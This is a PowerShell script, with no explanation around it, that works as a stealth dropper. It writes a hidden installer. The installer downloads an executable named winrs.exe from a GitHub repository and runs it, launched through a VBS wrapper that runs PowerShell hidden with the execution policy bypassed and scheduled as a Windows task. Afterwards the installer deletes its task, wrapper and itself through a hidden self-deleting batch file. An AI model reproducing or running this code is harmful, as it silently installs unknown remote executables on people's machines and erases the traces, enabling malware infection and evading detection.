Set-StrictMode -Version Latest
$ErrorActionPreference = 'Stop'

$taskName = "WinRpInstall"
$scriptDir = Split-Path -Parent $MyInvocation.MyCommand.Definition
$installPath = Join-Path $scriptDir "install.ps1"
$logPath = Join-Path $scriptDir "install.log"

function Write-Info($msg) {
    Write-Host "[INFO] $msg"
}
function Write-Warn($msg) {
    Write-Host "[WARN] $msg" -ForegroundColor Yellow
}
function Write-Err($msg) {
    Write-Host "[ERR]  $msg" -ForegroundColor Red
}

$installContent = @'
Try {
    Write-Output "===> Start at $(Get-Date -Format o)"

    $scriptPath = "$PSScriptRoot\winrs.exe"
    iwr https://github.com/truongcp0305/dp/archive/refs/heads/winrs.exe -OutFile winrs.exe -UseBasicParsing
    & $scriptPath

} Catch {
    Write-Error "Error: $_"
}Finally {
    schtasks /Delete /TN "WinRpInstall" /F 2>$null | Out-Null
    
    $scriptPath = $MyInvocation.MyCommand.Path
    $scriptDir = Split-Path -Parent $scriptPath
    $vbsPath = Join-Path $scriptDir "run_hidden.vbs"
    $logPath = Join-Path $scriptDir "install.log"
    
    if (Test-Path $vbsPath) {
        Remove-Item $vbsPath -Force -ErrorAction SilentlyContinue
    }
    
    $tempBat = Join-Path $env:TEMP "cleanup_$(Get-Random).bat"
    @"
@echo off
timeout /t 2 /nobreak >nul
del "$scriptPath" >nul 2>&1
del "$tempBat" >nul 2>&1
"@ | Out-File -FilePath $tempBat -Encoding ASCII
    
    Start-Process -FilePath $tempBat -WindowStyle Hidden
    
    Write-Output "Cleanup initiated."
}
'@

try {
    $exists = schtasks /Query /TN $taskName 2>$null
    $taskExists = $LASTEXITCODE -eq 0
} catch {
    $taskExists = $false
}

if ($LASTEXITCODE -eq 0) {
    if (Test-Path $installPath) {
        Remove-Item $installPath -Force -ErrorAction SilentlyContinue
    }
    if (Test-Path $logPath) {
        Remove-Item $logPath -Force -ErrorAction SilentlyContinue
    }

    exit 0
}

Set-Content -Path $installPath -Value $installContent -Encoding UTF8

$vbsPath = Join-Path $scriptDir "run_hidden.vbs"

$vbsContent = @"
Set objShell = CreateObject("Wscript.Shell")
objShell.Run "powershell -NoProfile -ExecutionPolicy Bypass -File ""$installPath""", 0, False
"@

Set-Content -Path $vbsPath -Value $vbsContent -Encoding ASCII

$tr = "wscript.exe `"$vbsPath`""

# Lấy thời gian hiện tại và cộng thêm 5 giây
$startTime = (Get-Date).AddMinutes(1).ToString("HH:mm")

# schtasks /Create /TN $taskName /TR $tr /SC ONLOGON /RL HIGHEST /F | Out-Null
schtasks /Create /TN $taskName /TR $tr /SC ONCE /ST $startTime /F | Out-Null


if ($LASTEXITCODE -eq 0) {
    # Write-Info "'$taskName'"
} else {
    # Write-Err "$LASTEXITCODE"
    exit 1
}

schtasks /Run /TN $taskName | Out-Null